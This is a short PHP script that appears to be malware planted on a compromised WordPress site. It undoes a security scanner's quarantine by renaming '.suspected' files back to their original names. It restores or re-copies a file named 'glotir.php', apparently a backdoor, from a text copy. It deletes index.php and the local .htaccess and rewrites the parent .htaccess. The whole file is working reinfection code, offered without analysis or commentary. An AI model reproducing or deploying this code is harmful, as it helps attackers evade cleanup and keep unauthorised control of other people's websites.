<?php

set_time_limit(0);
ignore_user_abort();

		$dir = scandir("..");


foreach ($dir as $dirr)
{
	if (strpos($dirr, ".suspected")) 
	{
		$newdirr = str_replace(".suspected", "", $dirr);
		rename("../".$dirr, "../".$newdirr);
	}		
}
		
    


if (file_exists("../.htaccess")) unlink ("../.htaccess");

		 	$outht = fopen("../../.htaccess", "w");
fwrite($outht, "# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
 
# END WordPress");
fclose($outht);
	
	if (file_exists("../glotir.php.suspected")) rename("../glotir.php.suspected", "../glotir.php");
	if (!file_exists("../glotir.php")) copy ("glotir.txt", "../glotir.php");
	//chmod("../glotir.php", 0777);
if (file_exists("../index.php")) unlink("../index.php");
if (file_exists("../d730d81e7o133a51c2bddc5c68874ce.zip")) unlink("../d730d81e7o133a51c2bddc5c68874ce.zip");


?>